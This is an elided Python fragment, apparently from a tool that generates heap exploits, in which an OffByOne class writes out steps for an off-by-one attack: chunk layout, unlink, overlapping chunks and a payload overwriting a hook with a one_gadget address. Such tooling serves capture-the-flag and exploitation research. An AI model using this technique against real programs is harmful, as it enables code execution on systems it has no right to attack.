...
class OffByOne(object):
    ...
    def get_exp(self):
        ...
        # prepare chunks
            ...
            b = op_add(0x70-8, "b'a'*0x60 + p64("+hex(0x170)+")")
            self.operations.append("\n# unlink")
            op_remove(c)
            self.operations.append("\n# overlap")
            a = op_add(0x100-8, '"aaa"')
            ...
            self.operations.append("payload = b\"a\"*19 + p64(one)")
            self.operations.append("# payload = b'a'*11 + p64(one) + p64(libc.symbols['realloc'] + offset)")
